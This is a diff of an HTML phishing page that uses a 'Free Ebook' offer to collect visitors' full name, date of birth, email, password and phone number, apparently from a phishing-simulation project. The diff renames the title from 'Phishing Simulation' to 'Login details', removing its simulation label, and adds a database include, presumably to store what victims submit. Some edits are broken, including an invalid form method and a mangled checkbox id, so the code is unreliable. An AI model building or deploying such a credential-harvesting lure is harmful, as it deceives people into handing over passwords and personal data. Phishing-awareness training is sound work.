@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phishing Simulation</title>
+    <title>Login details</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+    
     <style>
         body {
             font-family: 'Poppins', sans-serif;
-            background-color: #fff8e1; /* Light yellowish-white */
+            background-color: #fca55e; /* Light yellowish-white */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,7 +19,7 @@
         .container {
             width: 400px;
             padding: 40px;
-            background-color: #fff; /* White background for the form */
+            background-color: #ffffff; /* White background for the form */
             border-radius: 8px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
         }
@@ -26,7 +27,7 @@
         h1 {
             text-align: center;
             margin-bottom: 20px;
-            color: #ff9f43; /* Orange color for the header */
+            color: #fd6363; /* Orange color for the header */
         }
 
         .form-group {
@@ -56,6 +57,7 @@
 
         .form-group input[type="submit"]:hover {
             background-color: #e87c30; /* Darker orange on hover */
+            
         }
 
         .show-password {
@@ -73,10 +75,15 @@
 
 <div class="container">
     <h1>Get Your Free Ebook</h1>
-    <form action="phished_data.html" method="GET">
+    <form action="Redirecting page.html" method="NONE">
         <div class="form-group">
-            <label for="name">Your Name</label>
-            <input type="text" id="name" name="name" required>
+            <label for="name">Full Name</label>
+            <input type="text" id="name" name="Fullname" required>
+       
+        </div>
+        <div class="form-group">
+            <label for="DOB">DOB</label>
+            <input type="date" id="date" name="DOB" required>
         </div>
         <div class="form-group">
             <label for="email">Email</label>
@@ -87,14 +94,14 @@
             <input type="password" id="password" name="password" required>
         </div>
         <div class="show-password">
-            <input type="checkbox" id="showPassword"> Show Password
+            <input type="checkbox" id="showPas  sword"> Show Password
         </div>
         <div class="form-group">
             <label for="phone">Phone Number</label>
             <input type="tel" id="phone" name="phone" required>
         </div>
         <div class="form-group">
-            <input type="submit" value="Download Ebook">
+            <input type="submit" value="Get your E-Book">
         </div>
     </form>
 </div>
@@ -107,6 +114,10 @@
         passwordField.type = this.checked ? 'text' : 'password';
     });
 </script>
+<script src="alert.js"></script>
+
+<?php include 'db.php'; ?>
 
 </body>
 </html>
+
